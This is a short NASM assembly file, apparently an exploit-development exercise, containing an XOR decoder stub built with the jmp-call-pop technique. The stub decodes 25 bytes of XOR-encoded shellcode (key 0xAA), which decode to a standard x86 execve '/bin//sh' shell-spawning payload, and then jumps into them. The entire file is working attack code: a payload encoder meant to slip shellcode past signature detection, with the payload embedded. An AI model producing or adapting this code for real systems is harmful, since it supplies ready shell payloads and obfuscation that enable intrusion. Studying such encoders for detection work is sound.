;author 60dhi
;filename xorEncoder.nasm
;This code creates a xor decoder stub, decoded the xored shellcode under the label Shellcode using jmp call pop technique


global _start

section .text

_start:
	jmp short call_decoder

decoder:
	pop esi
	;loop using ecx register, thus loading the 25 in the ecx register as the length of the shellcode is 25
	xor ecx, ecx
	mov cl, 25	


decode:
	xor byte [esi], 0xAA
	inc esi
	loop decode
	;After 25 iterations, come out of the loop and below jmp instruction executes

	jmp short Shellcode

call_decoder:
	
	call decoder
	Shellcode: db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
